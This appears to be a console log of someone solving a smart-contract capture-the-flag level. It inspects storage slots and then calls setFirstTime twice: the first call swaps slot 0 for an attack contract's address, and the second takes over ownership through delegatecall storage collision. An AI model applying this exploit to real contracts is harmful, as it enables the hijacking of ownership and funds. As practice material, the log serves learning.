>contract.address
'0x697bc131219881bc8a958b2ed3a6523fE9cb155e'

>await contract.owner()
'0x97E982a15FbB1C28F6B8ee971BEc15C78b3d263F'

>await contract.timeZone1Library() //slot zero 
'0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5'

>await contract.timeZone2Library() // slot one 
'0xeA0De41EfafA05e2A54d1cD3ec8CE154b1Bb78F1'

>await web3.eth.getStorageAt(contract.address, 0, console.log)
'0x0000000000000000000000007dc17e761933d24f4917ef373f6433d4a62fe3c5' //matching slot zero 

>await web3.eth.getStorageAt(contract.address, 1, console.log)
'0x000000000000000000000000ea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1'

>await web3.eth.getStorageAt(contract.address, 2, console.log)
'0x00000000000000000000000097e982a15fbb1c28f6b8ee971bec15c78b3d263f'

//deployしたpreservationAttack.solのContractをcopy //pay gas 
await contract.setFirstTime("0x6dda42d465Dc1b86938A25fe0f97fCdd830D3332")
//successed to change slot zeroの timeZone1Library address 
{tx: '0x2b6292d89110f2888771cb29fb4f7aaa892c3824bcd24a35d05f4116099b14f5', receipt: {…}, logs: Array(0)}

//hack the contract //setFirstTimeの数字はランダム
await contract.setFirstTime("86753099")
{tx: '0x1c04fe4c41039f401661ebcdf107c8de88966a61bf692dc8f5c73c1fe1460af2', receipt: {…}, logs: Array(0)}
logs: []
receipt: {blockHash: '0x464fed330b0c9936f6b96add03c090a1863a3dcdcfcd2bc5f1ba30182ee36d94', blockNumber: 10930374, contractAddress: null, cumulativeGasUsed: 2987620, effectiveGasPrice: '0x903e4e82', …}
tx: "0x1c04fe4c41039f401661ebcdf107c8de88966a61bf692dc8f5c73c1fe1460af2"
[[Prototype]]: Object

//successed changed owner by myself!!
await.contract.owner()
'0xF6eA8E869C68362eC2FA1b2159Fe459D6D8f30F5'